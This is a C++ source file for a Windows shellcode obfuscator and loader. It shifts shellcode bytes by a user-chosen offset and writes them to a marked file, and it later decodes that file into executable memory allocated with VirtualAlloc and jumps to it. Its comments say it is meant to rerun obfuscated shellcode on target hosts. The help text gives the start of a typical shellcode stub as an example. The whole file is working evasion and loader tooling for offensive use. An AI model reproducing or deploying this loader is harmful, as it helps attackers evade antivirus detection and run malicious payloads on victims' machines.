#include "Windows.h"
#include <iostream>
#include <string>
#include <fstream>
#include <vector>
using namespace std;

//CAN OBFUSCATE SHELLCODE AND RERUN ON TARGET HOSTS.

void deobfuscateAndRun(int payloadSize, vector<unsigned char> ObfuscatedPayload, int offset) {

	void* safe = VirtualAlloc(0, payloadSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	unsigned char ArrDeObfuscatedPayload[10000];

	//RECREATING THE ORIGINAL PAYLOAD
	for (int i = 0; i < (payloadSize); i = i + 1) {
		unsigned char c;
		
		if ((ObfuscatedPayload[i] - offset) < 0) {
			c = 256 - (offset - ObfuscatedPayload[i]);
		}
		else {
			c = ObfuscatedPayload[i] - offset;
		}
		ArrDeObfuscatedPayload[i] = c;
		ArrDeObfuscatedPayload[i + 1] = '\0';
	}

	//PAYLOAD TIME  - DO THE DEED
	memcpy(safe, &ArrDeObfuscatedPayload, payloadSize);
	((void(*)())safe)();
}

void obfuscateAndPrint(int payloadLength, vector<unsigned char> payloadBytes, int offset, string slugLine) {
	

	FILE* fp;
	fp = fopen("ObfuscatedPayload.txt", "w");
	
	fprintf(fp, slugLine.c_str());
	fprintf(fp, "\n");


	for (int i = 0; i < payloadLength; i = i + 1) {
		if ((payloadBytes[i] + offset) > 255) {
			//129 breaks it... WHY
			//FF is added to
			char c = (payloadBytes[i] + offset) - 256;
			fprintf(fp, "%02x", c);
		}
		else {
			
			fprintf(fp, "%02x", payloadBytes[i] + offset);
		}
	}

	fprintf(fp, "\n");
	fprintf(fp, "%d", offset);
	fprintf(fp, "\n");

	fclose(fp);
}

int main(int argc, char* argv[]) {
	
	string slugLine = "15013MN1Y5W34r7H4714MUP70N0600D";
	int offset;

	if (argc > 1)
	{
		
		ifstream filePayload;
		filePayload.open(argv[1]);

		string payloadString;
		int payloadBytesLength;
		vector<unsigned char> vectorPayloadBytes;

		string firstLine;
		getline(filePayload, firstLine);
		filePayload >> ws;

		//Is this the slug?  If so... Lets run.  Otherwise Lets obfuscate.
		if (strcmp(slugLine.c_str(), firstLine.c_str()) != 0) {
			filePayload.close();
			payloadString = firstLine;
			payloadBytesLength = (payloadString.length() / 2);

			for (size_t i = 0; i < payloadString.length(); i += 2)
			{
				vectorPayloadBytes.push_back(std::stoi(payloadString.substr(i, 2), nullptr, 16));
			}
			offset = 0;
			while (offset < 1 || offset >= 100) {
				printf("ENTER OFFSET VALUE (1<X<100):");
				scanf_s("%i", &offset);
			}
			obfuscateAndPrint(payloadBytesLength, vectorPayloadBytes, offset, slugLine);
		}else{
		
			getline(filePayload, payloadString);
			payloadBytesLength = (payloadString.length() / 2);
			filePayload >> ws;
			filePayload >> offset;
			filePayload >> ws;
			filePayload.close();
			
			for (size_t i = 0; i < payloadString.length(); i += 2)
			{
				vectorPayloadBytes.push_back(std::stoi(payloadString.substr(i, 2), nullptr, 16));
			}

			deobfuscateAndRun(payloadBytesLength, vectorPayloadBytes, offset);

		}			

	}
	else {
		//       12345678901234567890123456789012345678901234567890
		cout << "Requires one argument; a filename for either:" << endl; 
		cout << "     (A) a file with shellcode to be obfuscated OR " << endl;
		cout << "     (B) an obfuscated file that is ready to be run." << endl << endl;
		cout << "(A) SHELLCODE FILE" << endl;
		cout << "     A plain text file containing hex formatted shellcode the first line." << endl;
		cout << "     EXAMPLE HEX FORMAT: fc4883e4f0e8c0000000415141505251564831d265{...}" << endl;
		cout << "(B)  OBFUSCATED FILE" << endl;
		cout << "      An obfuscated file is produced when a shellcode file (A) is " << endl;
		cout << "      provided to this EXE. The file contains a slug-phrase on " << endl;
		cout << "      line 1 to indicate its an obfuscated file.  Line 2 contains" << endl;
		cout << "      obfuscated shellcode.  Line 3 contains the offset value to" << endl;
		cout << "      reverse the ofuscation." << endl;
	}


	return 0;
}
